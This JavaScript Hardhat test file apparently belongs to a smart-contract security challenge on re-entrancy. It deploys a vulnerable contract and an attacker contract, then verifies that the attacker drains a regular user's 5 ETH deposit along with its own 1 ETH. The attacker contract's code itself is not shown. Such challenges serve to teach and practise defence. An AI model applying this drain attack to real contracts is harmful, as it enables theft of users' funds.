const { ethers, network } = require("hardhat")
const { expect } = require("chai")
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers")

describe.only("Challenge 10 - Re-entrancy", function () {
    const donationAmount = "5.0"

    async function initialStateFixture() {
        const [deployer, regularUser, donationRecepientUser, maliciousUser] = await ethers.getSigners()

        const Reentrance = await ethers.getContractFactory("Reentrance")
        const targetContract = await Reentrance.deploy()
        await targetContract.deployed()

        const N10Attacker = await ethers.getContractFactory("N10Attacker")
        const maliciousContract = await N10Attacker.deploy(targetContract.address)
        await maliciousContract.deployed()

        //regular, unsuspecting user donates funds
        const options = { value: ethers.utils.parseEther(donationAmount) }
        await targetContract.connect(regularUser).donate(donationRecepientUser.address, options)

        return { deployer, regularUser, donationRecepientUser, targetContract, maliciousUser, maliciousContract }
    }

    describe("Initial State", function () {
        it("Should deploy contracts with correct deployer", async function () {
            const { deployer, targetContract, maliciousContract } = await loadFixture(initialStateFixture)

            expect(targetContract.deployTransaction.from).to.equal(deployer.address)
            expect(maliciousContract.deployTransaction.from).to.equal(deployer.address)
        })

        it("Target contract has funds", async function () {
            const { donationRecepientUser, targetContract } = await loadFixture(initialStateFixture)
            const userBalance = await targetContract.balanceOf(donationRecepientUser.address)

            expect(userBalance).to.equal(ethers.utils.parseEther(donationAmount))
        })
    })

    describe("Attack Execution", function () {
        const initialFundAmount = "1.0"
        const options = { value: ethers.utils.parseEther(initialFundAmount) }

        it("Withdraw more funds than sent in", async function () {
            const { targetContract, maliciousUser, maliciousContract } = await loadFixture(initialStateFixture)

            //fund target contract initially so that we have some fund to withdraw
            let txnResponse = await targetContract.connect(maliciousUser).donate(maliciousContract.address, options)
            await txnResponse.wait()

            let maliciousContractBalance = await targetContract.balanceOf(maliciousContract.address)

            expect(maliciousContractBalance).to.equal(ethers.utils.parseEther(initialFundAmount))

            const provider = new ethers.providers.Web3Provider(network.provider)

            //pre-attack, the malicious contract has no funds
            maliciousContractBalance = await provider.getBalance(maliciousContract.address)
            expect(maliciousContractBalance).to.equal(ethers.utils.parseEther("0"))

            //attack...
            txnResponse = await maliciousContract.connect(maliciousUser).withdrawFunds(ethers.utils.parseEther(initialFundAmount))
            await txnResponse.wait()

            //post-attack, the malicious contract has all funds (5 eth deposited by regular user + 1 eth from malicious user)
            maliciousContractBalance = await provider.getBalance(maliciousContract.address)
            expect(maliciousContractBalance).to.equal(ethers.utils.parseEther(
                (parseInt(initialFundAmount) + parseInt(donationAmount)).toString())
            )
        })
    })
})